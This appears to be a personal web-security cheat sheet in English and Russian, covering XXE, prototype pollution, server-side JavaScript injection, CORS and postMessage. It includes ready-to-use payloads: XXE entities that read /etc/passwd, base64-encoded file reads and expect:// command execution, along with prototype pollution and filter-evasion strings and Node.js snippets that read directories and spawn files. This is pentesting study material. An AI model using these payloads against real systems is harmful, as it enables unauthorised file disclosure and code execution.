## XXE:  
Entities declaration: this type of entity declaration is called internal declaration as everything is defined inside the same document and nothing needs to be fetched externally.  
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ELEMENT student (#PCDATA)>
	<!ENTITY name "James Jones">
]>
<student>&name;</student>
```

**External entities**:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ELEMENT student (#PCDATA)>
	<!ENTITY sname SYSTEM "https://www.prakharprasad.com/external.xml">
]>
<student>&sname;</student>
```  

**Simple XXE attack: reading files**.  
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE student [
	<!ENTITY oops SYSTEM "file:///etc/passwd">
]>
<student>
	<name>&oops;</name>
</student>
```  

**Simple XXE attack: PHP Base64 conversion URI as an alternative**. (php://filter/convert.base64-encode/resource=/file/to/read)  
```
<!DOCTYPE student [
	<!ENTITY pwn SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<student>
	<name>&pwn;</name>
</student>
```  

**RCE thtough XXE**:  
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE name [
	<!ENTITY rce SYSTEM "expect://id">]>
<student>
	<name>&rce;</name>
</student>
```  

## Prototype Pollution:  
Уязвимость JavaScript позволяющая атакующему модифицировать свойства объектов глобальных прототипов которые могут наследоваться пользоватеьским прототипом.  
По-умолчанию JavaScript присваивает один из встроенных прототипов новому объекту:  
	- let myObj = {}; //Object.prototype  
 	- let myString = ""; //String.prototype  
  	- let myNumber = 1; //Number.prototype  
   	- let myArray = []; //Array.prototype  

Наследование прототипов:  
- Object.prototype
	- String.prototype
	- Number.prototype
 	- Array.prototype
		- myObject

```
var book = {bookName: "Book name", authorName: "Author of book"};
console.log(book.toString())
//output: “[object Object]”

book.__proto__.toString = ()=>{alert("polluted")}
console.log(book.toString())
// alert box pops up: “polluted”

IMAGE: alert pops up with value “polluted”
```

**Basic payload**: ```__proto__.property=value OR __proto__[property]=value```  
**Filter evasion**: ```__pro__proto__to__.gadget=payload```  
**JSON parse payload**: ```{"__proto__":{"property":"value"}}```  

**Additional resources**:  
https://www.mend.io/resources/blog/prototype-pollution-vulnerabilities/  
https://guidesmiths.github.io/cybersecurity-handbook/attacks_explained/prototype_pollution  
https://youtu.be/W9_x8pc_bh8  
https://youtu.be/Z6CtDSx8C5k  
https://portswigger.net/web-security/prototype-pollution/client-side  
https://portswigger.net/web-security/prototype-pollution/server-side  


## MASS ASSIGNMENT ATTACK:

**Additional information**:  
https://youtu.be/r1j0COUMTqw  

## ONLINE DECOMPILER:  
https://dogbolt.org  

## JavaScript:  

**SSJI**: JavaScript injection (Node.js)  
1. Listing directories and read files: response.end(require('fs').readdirSync('.').toString()  
2. Execute file on filesystem: require('child_process').spawn(filename);   

**Additional information**: 
1. HTTP Networking: https://www.freecodecamp.org/news/http-full-course/  
2. 

## CORS  

**Basic Info**:  

#All domain are allowed  
Access-Control-Allow-Origin: *  

#Comma-separated list of domains  
Access-Control-Allow-Origin: example.com, metrics.com  

#Allow passing credenitals in the requests  
Access-Control-Allow-Credentials: true  

#Disallow passing in the requests  
Access-Control-Allow-Credentials: false  

**Medium article**: https://medium.com/r3d-buck3t/cross-origin-resource-sharing-cors-testing-guide-29616c225a0a  

## Dependency Confusion:  

**Tool for static checks**: https://github.com/visma-prodsec/confused   

## postMessage XSS  
Метод window.postMessage() безопасно обеспечивает кросс-доменную коммуникацию между объектами Window; например, между страницей и всплывающим окном, которое она породила, или между страницей и iframe, встроенным в нее. Обычно скриптам на разных страницах разрешается обращаться друг к другу тогда и только тогда, когда соблюдается SOP. SOP (Same Origin Policy) - "политика одинакового происхождения", предотвращает кросс-доменные атаки, блокируя чтение загружаемых ресурсов из другого источника. Источник идентифицируется по таким параметрам: схема, полное имя хоста, порт. Когда хотя бы один из параметров у источников не совпадает, обмен данными между ресурсами запрещается. CORS (Cross-Origin Resource Sharing) - механизм совместного использования ресурсов разными источниками. Он регламентирует три категории сетевого взаимодействия: 1. запись из разных источников (переадресации, отправки форм и переходы по ссылкам); 2. Вставка из разных источников, эта категория регламентирует элементы, загружаемые посредтвом тегов \<link\>, \<script\>, \<img\>, \<video\>, \<audio\>, \<iframe\>, и других; 3. Считывание из разных источников, эта категория регламентирует элементы, загружаемые через AJAX и fetch. Если на сайте корректно настроены механизмы безопасности SOP и CORS, использование postMessage будет единственным доступным способом передачи данных между документами на разных доменах. Запросы, созданне с помощью других методов (например, XMLHttpRequest или Fetch API), будут заблокированы в соответствии с SOP и CORS.  

postMessage(message, targetOrigin, transfer);
message - отправляемые данные, эти данные автоматически сериализуются для передачи.
targetOrigin - источник родительского окна.
transfer - последовательность передаваемых объектов, которые передаются вместе с сообщением.
